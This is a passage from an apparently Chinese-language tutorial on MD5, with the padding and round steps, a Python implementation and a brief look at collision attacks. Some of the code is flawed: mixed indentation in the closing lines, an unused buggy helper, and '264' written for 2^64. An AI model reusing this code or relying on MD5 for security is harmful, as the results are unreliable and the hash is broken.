<li>步骤一：数据填充。对消息进行数据填充，使消息的长度对512取模得448，设消息长度为X，即满    足X mod 512=448。根据此公式得出需要填充的数据长度。填充方法：在消息后面进行填充，填充第一位为1，其余为0。</li>
<li>步骤二：添加消息长度。在第一步结果之后再填充上原消息的长度，可用来进行的存储长度为64位。如果消息长度大于264，则只使用其低64位的值，即（消息长度 对 264取模）。在此步骤进行完毕后，最终消息长度就是512的整数倍。</li>
<li>步骤三：初始化链接变量。MD5使用4个32位的寄存器A、B、C、D，最开始存放4个固定的32位初始链接变量，这些参数用于第一轮迭代。</li>
<li>步骤四：分组处理。将每个分组（512比特）分成16个小组，每个小组32位，这些分组参与每轮16步的函数运算，输出为32位值，经过4轮（共有四个轮函数）共64步之后，得到的4个寄存器的值分别于输入链接变量进行模加，即得到此次分组处理的输入链接变量。第四轮最后一步完成后，再与该分组最初的寄存器的初值相加，然后把A、B、C、D的值作为下一个迭代压缩的链接变量输入，直到最后一个消息分组得到的A、B、C、D寄存器值级联输出作为128比特的消息散列值。</li>
</ul>
<p>​    此处需要特别指出的是，在MD5的代码实现中，要特别注意<strong>小端序</strong>和<strong>大端序</strong>的问题，这个问题如果不注意的话会导致MD5计算出错。而MD5的所有数据计算都是基于<strong>小端序</strong>的。</p>
<blockquote>
<p>小端字节序（Little Endian）：低位字节存放在低内存地址，高位字节存放在高内存地址端。  大端字节序（Big Endian）：高位字节存放在低内存地址，低位字节存放在高内存地址端。</p>
</blockquote>
<p>​    在步骤二中添加消息长度就要按照小端序的方法填充长度，同时轮函数中各个参数也要按照小端序来计算，这点一定要特别注意。</p>
<p>​    还有对于需要处理多个分组的情况，要做好A、B、C、D寄存器的及时更新，否则无法得到正确的MD5值。</p>
<p><em>代码如下：</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转为2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(s)</span>:</span></span><br><span class="line">	text = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">		text += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line">	<span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 附加填充，输入为字母明文，输出为二进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additonal_filling</span><span class="params">(data)</span>:</span></span><br><span class="line">	bin_data = str2bin(data)</span><br><span class="line">	origi_mess_len = len(bin_data)</span><br><span class="line">	<span class="keyword">if</span> origi_mess_len &gt; math.pow(<span class="number">2</span>,<span class="number">64</span>):</span><br><span class="line">		print(<span class="string">'Message too long!'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		bit_origi_mess_len = <span class="string">f'<span class="subst">&#123;bin(origi_mess_len)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">64</span>&#125;</span>'</span></span><br><span class="line">		mod_remain = origi_mess_len % <span class="number">512</span>  <span class="comment"># 余数</span></span><br><span class="line">		<span class="keyword">if</span> mod_remain &lt; <span class="number">449</span>:</span><br><span class="line">			padding_len = <span class="number">448</span> - mod_remain</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			padding_len = <span class="number">448</span> - mod_remain + <span class="number">512</span></span><br><span class="line">		<span class="keyword">if</span> padding_len == <span class="number">1</span>:</span><br><span class="line">			bin_data += <span class="string">'1'</span></span><br><span class="line">		<span class="keyword">elif</span> padding_len &gt; <span class="number">1</span>:</span><br><span class="line">			bin_data = bin_data + <span class="string">'1'</span> + <span class="string">'0'</span> * (padding_len<span class="number">-1</span>)</span><br><span class="line">		left = bit_origi_mess_len[:<span class="number">32</span>]</span><br><span class="line">		right = bit_origi_mess_len[<span class="number">32</span>:]</span><br><span class="line">		left = left[<span class="number">24</span>:<span class="number">32</span>] + left[<span class="number">16</span>:<span class="number">24</span>] + left[<span class="number">8</span>:<span class="number">16</span>] + left[:<span class="number">8</span>]</span><br><span class="line">		right = right[<span class="number">24</span>:<span class="number">32</span>] + right[<span class="number">16</span>:<span class="number">24</span>] + right[<span class="number">8</span>:<span class="number">16</span>] + right[:<span class="number">8</span>]</span><br><span class="line">		<span class="comment"># 32为为一组</span></span><br><span class="line">		bin_data += (right + left)</span><br><span class="line">		<span class="keyword">return</span> bin_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代压缩，输出为分组比特消息数组，每组的长度为512bit</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iter_compress</span><span class="params">(bdata)</span>:</span></span><br><span class="line">	group_mess = [[]*<span class="number">16</span>] <span class="comment"># 分组消息数组</span></span><br><span class="line">	print(len(bdata))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(bdata)//<span class="number">512</span>):</span><br><span class="line">		temp = bdata[i*<span class="number">512</span>:i*<span class="number">512</span>+<span class="number">512</span>]</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">			print(temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line">			group_mess[i].append(temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line">	<span class="keyword">return</span> group_mess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小端序处理 @input hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">little_endian</span><span class="params">(x,n)</span>:</span></span><br><span class="line">	x = <span class="string">f'<span class="subst">&#123;bin(x)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;n&#125;</span>&#125;'</span></span><br><span class="line">	ans = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(n//<span class="number">8</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">		ans += x[(i<span class="number">-1</span>)*<span class="number">8</span>:i*<span class="number">8</span>]</span><br><span class="line">	<span class="keyword">return</span> int(ans,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于逻辑非比较特殊，所以另外实现一下,输入为16进制数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_operate</span><span class="params">(data)</span>:</span></span><br><span class="line">	data = <span class="string">f'<span class="subst">&#123;bin(data)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">32</span>&#125;</span>'</span></span><br><span class="line">	out = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">"0"</span>:</span><br><span class="line">			out += <span class="string">"1"</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			out += <span class="string">"0"</span></span><br><span class="line">	<span class="keyword">return</span> int(out,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 四个非线性函数,输入均为32bit的三个数据</span></span><br><span class="line"><span class="comment"># @input hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> (x&amp;y) | (not_operate(x) &amp; z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">G</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> (x &amp; z) | (y &amp; not_operate(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">H</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> (x ^ y ^ z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">I</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> y ^ (x | not_operate(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate_move</span><span class="params">(x,n)</span>:</span></span><br><span class="line">	x = <span class="string">f'<span class="subst">&#123;bin(x)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">32</span>&#125;</span>'</span></span><br><span class="line">	<span class="keyword">return</span> int(x[n:] + x[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># t[i]，返回10进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_t</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> int(math.pow(<span class="number">2</span>,<span class="number">32</span>) * abs(math.sin(i)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># @input digital</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FF</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">	<span class="comment"># m = int(m,2)</span></span><br><span class="line">	m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">	t = a + F(b,c,d) + m + Ti </span><br><span class="line">	t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GG</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">	m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">	t = a + G(b,c,d) + m + Ti </span><br><span class="line">	t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HH</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">	m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">	t = a + H(b,c,d) + m + Ti </span><br><span class="line">	t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">return</span> a	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">II</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">	m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">	t = a + I(b,c,d) + m + Ti </span><br><span class="line">	t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span><span class="params">(M)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> A</span><br><span class="line">	<span class="keyword">global</span> B</span><br><span class="line">	<span class="keyword">global</span> C</span><br><span class="line">	<span class="keyword">global</span> D</span><br><span class="line">	<span class="comment"># 复制前一分组的链接变量</span></span><br><span class="line">	AA = A</span><br><span class="line">	BB = B</span><br><span class="line">	CC = C</span><br><span class="line">	DD = D</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(M)):</span><br><span class="line">		<span class="comment"># 第一轮循环</span></span><br><span class="line">		A = FF(A,B,C,D,M[i][<span class="number">0</span>],<span class="number">7</span>,get_t(<span class="number">1</span>))</span><br><span class="line">		D = FF(D,A,B,C,M[i][<span class="number">1</span>],<span class="number">12</span>,get_t(<span class="number">2</span>))</span><br><span class="line">		C = FF(C,D,A,B,M[i][<span class="number">2</span>],<span class="number">17</span>,get_t(<span class="number">3</span>))</span><br><span class="line">		B = FF(B,C,D,A,M[i][<span class="number">3</span>],<span class="number">22</span>,get_t(<span class="number">4</span>))</span><br><span class="line">		A = FF(A,B,C,D,M[i][<span class="number">4</span>],<span class="number">7</span>,get_t(<span class="number">5</span>))</span><br><span class="line">		D = FF(D,A,B,C,M[i][<span class="number">5</span>],<span class="number">12</span>,get_t(<span class="number">6</span>))</span><br><span class="line">		C = FF(C,D,A,B,M[i][<span class="number">6</span>],<span class="number">17</span>,get_t(<span class="number">7</span>))</span><br><span class="line">		B = FF(B,C,D,A,M[i][<span class="number">7</span>],<span class="number">22</span>,get_t(<span class="number">8</span>))</span><br><span class="line">		A = FF(A,B,C,D,M[i][<span class="number">8</span>],<span class="number">7</span>,get_t(<span class="number">9</span>))</span><br><span class="line">		D = FF(D,A,B,C,M[i][<span class="number">9</span>],<span class="number">12</span>,get_t(<span class="number">10</span>))</span><br><span class="line">		C = FF(C,D,A,B,M[i][<span class="number">10</span>],<span class="number">17</span>,get_t(<span class="number">11</span>))</span><br><span class="line">		B = FF(B,C,D,A,M[i][<span class="number">11</span>],<span class="number">22</span>,get_t(<span class="number">12</span>))</span><br><span class="line">		A = FF(A,B,C,D,M[i][<span class="number">12</span>],<span class="number">7</span>,get_t(<span class="number">13</span>))</span><br><span class="line">		D = FF(D,A,B,C,M[i][<span class="number">13</span>],<span class="number">12</span>,get_t(<span class="number">14</span>))</span><br><span class="line">		C = FF(C,D,A,B,M[i][<span class="number">14</span>],<span class="number">17</span>,get_t(<span class="number">15</span>))</span><br><span class="line">		B = FF(B,C,D,A,M[i][<span class="number">15</span>],<span class="number">22</span>,get_t(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 第二轮循环</span></span><br><span class="line">		A = GG(A,B,C,D,M[i][<span class="number">1</span>],<span class="number">5</span>,get_t(<span class="number">17</span>))</span><br><span class="line">		D = GG(D,A,B,C,M[i][<span class="number">6</span>],<span class="number">9</span>,get_t(<span class="number">18</span>))</span><br><span class="line">		C = GG(C,D,A,B,M[i][<span class="number">11</span>],<span class="number">14</span>,get_t(<span class="number">19</span>))</span><br><span class="line">		B = GG(B,C,D,A,M[i][<span class="number">0</span>],<span class="number">20</span>,get_t(<span class="number">20</span>))</span><br><span class="line">		A = GG(A,B,C,D,M[i][<span class="number">5</span>],<span class="number">5</span>,get_t(<span class="number">21</span>))</span><br><span class="line">		D = GG(D,A,B,C,M[i][<span class="number">10</span>],<span class="number">9</span>,get_t(<span class="number">22</span>))</span><br><span class="line">		C = GG(C,D,A,B,M[i][<span class="number">15</span>],<span class="number">14</span>,get_t(<span class="number">23</span>))</span><br><span class="line">		B = GG(B,C,D,A,M[i][<span class="number">4</span>],<span class="number">20</span>,get_t(<span class="number">24</span>))</span><br><span class="line">		A = GG(A,B,C,D,M[i][<span class="number">9</span>],<span class="number">5</span>,get_t(<span class="number">25</span>))</span><br><span class="line">		D = GG(D,A,B,C,M[i][<span class="number">14</span>],<span class="number">9</span>,get_t(<span class="number">26</span>))</span><br><span class="line">		C = GG(C,D,A,B,M[i][<span class="number">3</span>],<span class="number">14</span>,get_t(<span class="number">27</span>))</span><br><span class="line">		B = GG(B,C,D,A,M[i][<span class="number">8</span>],<span class="number">20</span>,get_t(<span class="number">28</span>))</span><br><span class="line">		A = GG(A,B,C,D,M[i][<span class="number">13</span>],<span class="number">5</span>,get_t(<span class="number">29</span>))</span><br><span class="line">		D = GG(D,A,B,C,M[i][<span class="number">2</span>],<span class="number">9</span>,get_t(<span class="number">30</span>))</span><br><span class="line">		C = GG(C,D,A,B,M[i][<span class="number">7</span>],<span class="number">14</span>,get_t(<span class="number">31</span>))</span><br><span class="line">		B = GG(B,C,D,A,M[i][<span class="number">12</span>],<span class="number">20</span>,get_t(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 第三轮循环</span></span><br><span class="line">		A = HH(A,B,C,D,M[i][<span class="number">5</span>],<span class="number">4</span>,get_t(<span class="number">33</span>))</span><br><span class="line">		D = HH(D,A,B,C,M[i][<span class="number">8</span>],<span class="number">11</span>,get_t(<span class="number">34</span>))</span><br><span class="line">		C = HH(C,D,A,B,M[i][<span class="number">11</span>],<span class="number">16</span>,get_t(<span class="number">35</span>))</span><br><span class="line">		B = HH(B,C,D,A,M[i][<span class="number">14</span>],<span class="number">23</span>,get_t(<span class="number">36</span>))</span><br><span class="line">		A = HH(A,B,C,D,M[i][<span class="number">1</span>],<span class="number">4</span>,get_t(<span class="number">37</span>))</span><br><span class="line">		D = HH(D,A,B,C,M[i][<span class="number">4</span>],<span class="number">11</span>,get_t(<span class="number">38</span>))</span><br><span class="line">		C = HH(C,D,A,B,M[i][<span class="number">7</span>],<span class="number">16</span>,get_t(<span class="number">39</span>))</span><br><span class="line">		B = HH(B,C,D,A,M[i][<span class="number">10</span>],<span class="number">23</span>,get_t(<span class="number">40</span>))</span><br><span class="line">		A = HH(A,B,C,D,M[i][<span class="number">13</span>],<span class="number">4</span>,get_t(<span class="number">41</span>))</span><br><span class="line">		D = HH(D,A,B,C,M[i][<span class="number">0</span>],<span class="number">11</span>,get_t(<span class="number">42</span>))</span><br><span class="line">		C = HH(C,D,A,B,M[i][<span class="number">3</span>],<span class="number">16</span>,get_t(<span class="number">43</span>))</span><br><span class="line">		B = HH(B,C,D,A,M[i][<span class="number">6</span>],<span class="number">23</span>,get_t(<span class="number">44</span>))</span><br><span class="line">		A = HH(A,B,C,D,M[i][<span class="number">9</span>],<span class="number">4</span>,get_t(<span class="number">45</span>))</span><br><span class="line">		D = HH(D,A,B,C,M[i][<span class="number">12</span>],<span class="number">11</span>,get_t(<span class="number">46</span>))</span><br><span class="line">		C = HH(C,D,A,B,M[i][<span class="number">15</span>],<span class="number">16</span>,get_t(<span class="number">47</span>))</span><br><span class="line">		B = HH(B,C,D,A,M[i][<span class="number">2</span>],<span class="number">23</span>,get_t(<span class="number">48</span>))</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 第四轮循环</span></span><br><span class="line">		A = II(A,B,C,D,M[i][<span class="number">0</span>],<span class="number">6</span>,get_t(<span class="number">49</span>))</span><br><span class="line">		D = II(D,A,B,C,M[i][<span class="number">7</span>],<span class="number">10</span>,get_t(<span class="number">50</span>))</span><br><span class="line">		C = II(C,D,A,B,M[i][<span class="number">14</span>],<span class="number">15</span>,get_t(<span class="number">51</span>))</span><br><span class="line">		B = II(B,C,D,A,M[i][<span class="number">5</span>],<span class="number">21</span>,get_t(<span class="number">52</span>))</span><br><span class="line">		A = II(A,B,C,D,M[i][<span class="number">12</span>],<span class="number">6</span>,get_t(<span class="number">53</span>))</span><br><span class="line">		D = II(D,A,B,C,M[i][<span class="number">3</span>],<span class="number">10</span>,get_t(<span class="number">54</span>))</span><br><span class="line">		C = II(C,D,A,B,M[i][<span class="number">10</span>],<span class="number">15</span>,get_t(<span class="number">55</span>))</span><br><span class="line">		B = II(B,C,D,A,M[i][<span class="number">1</span>],<span class="number">21</span>,get_t(<span class="number">56</span>))</span><br><span class="line">		A = II(A,B,C,D,M[i][<span class="number">8</span>],<span class="number">6</span>,get_t(<span class="number">57</span>))</span><br><span class="line">		D = II(D,A,B,C,M[i][<span class="number">15</span>],<span class="number">10</span>,get_t(<span class="number">58</span>))</span><br><span class="line">		C = II(C,D,A,B,M[i][<span class="number">6</span>],<span class="number">15</span>,get_t(<span class="number">59</span>))</span><br><span class="line">		B = II(B,C,D,A,M[i][<span class="number">13</span>],<span class="number">21</span>,get_t(<span class="number">60</span>))</span><br><span class="line">		A = II(A,B,C,D,M[i][<span class="number">4</span>],<span class="number">6</span>,get_t(<span class="number">61</span>))</span><br><span class="line">		D = II(D,A,B,C,M[i][<span class="number">11</span>],<span class="number">10</span>,get_t(<span class="number">62</span>))</span><br><span class="line">		C = II(C,D,A,B,M[i][<span class="number">2</span>],<span class="number">15</span>,get_t(<span class="number">63</span>))</span><br><span class="line">		B = II(B,C,D,A,M[i][<span class="number">9</span>],<span class="number">21</span>,get_t(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">		A = (AA + A) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">		B = (BB + B) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">		C = (CC + C) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">		D = (DD + D) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">		AA = A</span><br><span class="line">		BB = B</span><br><span class="line">		CC = C</span><br><span class="line">		DD = D</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(word)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> A,B,C,D</span><br><span class="line">	<span class="comment"># 初始化链接向量</span></span><br><span class="line">	A = <span class="number">0x67452301</span></span><br><span class="line">	B = <span class="number">0xEFCDAB89</span></span><br><span class="line">	C = <span class="number">0x98BADCFE</span></span><br><span class="line">	D = <span class="number">0x10325476</span></span><br><span class="line">	bintext = additonal_filling(word)</span><br><span class="line">	bdata = bintext</span><br><span class="line">	group_mess = [[]*<span class="number">16</span>] <span class="comment"># 分组消息数组</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">		group_mess[<span class="number">0</span>].append(<span class="string">""</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(bdata)//<span class="number">512</span>):</span><br><span class="line">		temp = bdata[i*<span class="number">512</span>:i*<span class="number">512</span>+<span class="number">512</span>]</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">			group_mess[<span class="number">0</span>][j] = temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>]</span><br><span class="line">		step_function(group_mess)</span><br><span class="line">	A = hex(A)[<span class="number">2</span>:]</span><br><span class="line">	B = hex(B)[<span class="number">2</span>:]</span><br><span class="line">	C = hex(C)[<span class="number">2</span>:]</span><br><span class="line">	D = hex(D)[<span class="number">2</span>:]</span><br><span class="line">	<span class="comment"># 按小端字节序级联输出</span></span><br><span class="line">	out = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> (A,B,C,D):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>//<span class="number">2</span>):</span><br><span class="line">			out += item[(<span class="number">3</span>-i)*<span class="number">2</span>:(<span class="number">3</span>-i)*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">	<span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	word1 = <span class="string">"iscbupt"</span></span><br><span class="line">	word2 = <span class="string">"Beijing University of Posts and TelecommunicationsBeijing University of Posts and Telecommunications"</span></span><br><span class="line">	word3 = <span class="string">"State Key Laboratory of Networking and Switching"</span></span><br><span class="line">	word4 = <span class="string">"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!"</span></span><br><span class="line">	print(word1)</span><br><span class="line">    print(encrypt(word1))</span><br><span class="line">    print(word2)</span><br><span class="line">	print(encrypt(word2))</span><br></pre></td></tr></table></figure>
<p><strong>实例演示：</strong></p>
<p><img src="crypto2/2.png" alt="demo"></p>
<p><strong>安全性分析</strong></p>
<p>​    MD5算法是一种哈希算法，所以对于MD5算法的安全问题主要在于它是否具有足够的抗碰撞性。</p>
<p>​    在碰撞攻击方面，王小云教授研究很深入，她的成果集中在加速构造碰撞对。原来理论上构造出一个MD5碰撞对需要2^64次尝试，而现在只需要2^39次，其算法大大加速了这一过程。但从应用场景上来看，它本身并不具备太多的应用价值，因为构造出的碰撞很可能毫无意义。它的价值在于，<strong>在此算法基础上衍生出来的一系列MD5的算法，能够在部分场景下，构造出一个有意义的伪造信息，并且MD5值保持不变。</strong>所以，单单看这个算法本身就说MD5不安全，有些夸大其实。但是，后续的那些算法出现之后，MD5的安全性就真的有些令人担忧了，也就是下文要说的两种算法。 </p>
<ul>
